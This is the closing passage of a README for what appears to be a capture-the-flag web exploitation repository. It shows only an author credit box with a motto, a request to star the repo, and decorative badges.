  ║   Made by Nithishkumar S                                  ║
  ║   🏆 National CTF Finalist | Web Exploitation Specialist  ║
  ║                                                           ║
  ║   "If you can break it, you can secure it." 🔓            ║
  ║                                                           ║
  ╚═══════════════════════════════════════════════════════════╝
```

⭐ **Star this repo if it helped you capture flags!**

![Made with](https://img.shields.io/badge/Made_With-Sleepless_Nights-ff3333?style=for-the-badge)
![CTF](https://img.shields.io/badge/CTF-National_Finalist-00ff88?style=for-the-badge)
![Web](https://img.shields.io/badge/Web-Exploitation-cc0000?style=for-the-badge)

</div>
